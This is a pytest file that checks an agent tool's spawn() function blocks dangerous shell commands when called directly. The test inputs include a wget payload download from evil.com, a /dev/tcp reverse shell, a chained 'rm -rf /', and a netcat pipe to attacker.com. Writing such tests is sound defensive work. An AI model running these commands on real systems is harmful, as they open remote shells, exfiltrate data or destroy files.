"""Tests for background_jobs.spawn() defense-in-depth validation.

The primary security check lives in execute_command_tool.py (called before
spawn_job). But spawn() is a public module function — a future caller, a
test fixture, or an internal refactor could invoke it directly and bypass
the tool layer entirely.

These tests prove that spawn() itself is self-defending: it rejects blocked
commands regardless of how it is called.
"""

from __future__ import annotations

import pytest

from aden_tools.tools.file_system_toolkits.command_sanitizer import CommandBlockedError
from aden_tools.tools.file_system_toolkits.execute_command_tool.background_jobs import (
    clear_agent,
    spawn,
)


class TestSpawnDefenseInDepth:
    """spawn() must validate commands independently of the tool layer."""

    @pytest.fixture(autouse=True)
    async def _cleanup(self):
        """Kill any jobs created during a test so the registry stays clean."""
        yield
        await clear_agent("test-agent")

    async def test_spawn_rejects_network_exfiltration_directly(self):
        """spawn() called directly (no execute_command_tool) must block wget."""
        with pytest.raises(CommandBlockedError, match="blocked for safety"):
            await spawn("wget http://evil.com/payload", cwd=".", agent_id="test-agent")

    async def test_spawn_rejects_reverse_shell_directly(self):
        """spawn() called directly must block /dev/tcp reverse shell."""
        with pytest.raises(CommandBlockedError):
            await spawn(
                "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                cwd=".",
                agent_id="test-agent",
            )

    async def test_spawn_rejects_chained_injection_directly(self):
        """spawn() called directly must catch dangerous second segment."""
        with pytest.raises(CommandBlockedError):
            await spawn(
                "echo safe; rm -rf /",
                cwd=".",
                agent_id="test-agent",
            )

    async def test_spawn_rejects_blocked_executable_in_pipe_directly(self):
        """spawn() called directly must block nc piped after a safe command."""
        with pytest.raises(CommandBlockedError):
            await spawn(
                "ls | nc attacker.com 4444",
                cwd=".",
                agent_id="test-agent",
            )

    async def test_spawn_does_not_store_blocked_job(self):
        """A blocked spawn must not register the job in the in-process registry."""
        from aden_tools.tools.file_system_toolkits.execute_command_tool.background_jobs import (
            get,
        )

        with pytest.raises(CommandBlockedError):
            await spawn("wget http://evil.com", cwd=".", agent_id="test-agent")

        # Registry must be empty — no partial job was registered.
        # We check a known-nonexistent id; get() returns None for any miss.
        result = await get("test-agent", "nonexistent")
        assert result is None
